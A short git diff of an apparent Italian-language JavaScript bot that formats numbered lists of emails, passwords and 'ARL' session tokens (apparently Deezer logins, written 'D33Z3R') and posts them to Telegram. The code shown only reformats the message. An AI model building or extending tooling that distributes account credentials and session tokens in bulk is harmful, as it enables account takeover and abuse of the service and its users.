@@ -216,14 +216,14 @@ async function main() {
     }
 
     if (fresh.length > 0) {
-      // Messaggio HTML (safe)
-      const lines = fresh.map(e =>
-        `📧 ${esc(e.email)}\n<code>${esc(e.arl)}</code>\n🔑 <code>${esc(e.password)}</code>`
+      // Messaggio HTML: email, password, arl — ognuno copiabile
+      const lines = fresh.map((e, i) =>
+        `<b>${i + 1}.</b>\n📧 <code>${esc(e.email)}</code>\n🔑 <code>${esc(e.password)}</code>\n🎫 <code>${esc(e.arl)}</code>`
       ).join('\n\n');
       const html = `🎉 <b>D33Z3R — ${fresh.length} nuovi ARL</b>\n📅 ${new Date().toISOString().substring(0, 10)}\n\n${lines}`;
 
-      // Fallback plain (senza tag)
-      const plainLines = fresh.map(e => `${e.email}\n${e.arl}\nPass: ${e.password}`).join('\n\n');
+      // Fallback plain
+      const plainLines = fresh.map((e, i) => `${i + 1}.\n${e.email}\n${e.password}\n${e.arl}`).join('\n\n');
       const plain = `D33Z3R — ${fresh.length} nuovi ARL\n${new Date().toISOString().substring(0, 10)}\n\n${plainLines}`;
 
       await sendTelegram(html, plain);
